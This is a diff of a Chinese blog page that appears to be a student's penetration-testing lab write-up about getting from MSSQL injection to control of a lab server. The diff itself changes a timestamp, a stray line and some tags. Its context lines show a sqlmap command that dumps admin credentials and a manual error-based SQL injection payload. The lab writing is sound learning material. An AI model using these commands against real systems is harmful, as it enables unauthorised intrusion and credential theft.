@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/tiquan2.PNG">
 <meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/tiquan3.PNG">
 <meta property="og:image" content="http://muradil.github.io/2019/08/15/mssql注入到拿下服务器/010.PNG">
-<meta property="og:updated_time" content="2019-08-15T14:16:25.933Z">
+<meta property="og:updated_time" content="2019-08-15T14:28:17.627Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mssql注入到拿下服务器">
 <meta name="twitter:description" content="【背景】：最近在学web渗透测试，老师丢我们一个IP地址让我们拿下服务器 （） 服务器地址为：192.168.144.190 首先拿到了IP之后先对服务器进行信息收集这里用nmap对服务器进行端口扫描发现开了一些端口  发现开了3306端口判断为开了数据库服务，然后还开了8000端口猜测一下可能是http服务尝试着拿浏览器访问地址发现了一个网站随手点了几个链接感觉像注入点">
@@ -238,7 +238,6 @@
 <p><code>sqlmap -u http://192.168.144.190:8000/onews.asp?id=181 -D  aa(数据库名) -T admin（表名）-C（列名） admin,password --dump （爆出字段内容）</code>        </p>
 <p><img src="/2019/08/15/mssql注入到拿下服务器/账号密码.PNG" alt></p>
 <p>爆出账号密码后乱码了可能是因为mssql数据库的原因尝试着构造手工注入</p>
-<p>？     跟在哪</p>
 <p><code>and (select top 1 password from aa.dbo.admin where admin not in (select top 1 admin from aa.dbo.admin) )&gt;1</code></p>
 <p>尝试着让他报错然后爆出密码</p>
 <p><img src="/2019/08/15/mssql注入到拿下服务器/1.PNG" alt></p>
@@ -519,6 +518,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">-逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">web渗透测试</a>
               </li>
              
@@ -528,10 +531,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">-逆向</a>
               </li>
             
             <div class="clearfix"></div>
